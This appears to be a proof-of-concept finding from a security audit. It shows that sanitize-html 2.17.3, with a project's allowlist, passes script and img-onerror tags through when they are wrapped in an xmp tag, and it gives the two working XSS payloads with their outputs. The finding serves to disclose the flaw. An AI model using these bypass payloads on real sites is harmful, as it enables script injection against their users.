# PoC — sanitize-html XMP bypass

PoC-Status: executed

With KeyFate's exact allowlist and installed `sanitize-html@2.17.3`:

```ts
sanitizeHtml('<xmp><script>audit()</script></xmp>', keyFateOptions)
// => <script>audit()</script>

sanitizeHtml('<xmp><img src=x onerror=audit()></xmp>', keyFateOptions)
// => <img src=x onerror=audit()>
```

See `evidence/sanitize-html-poc.log`. The audit did not insert the output into a browser or alter blog content.
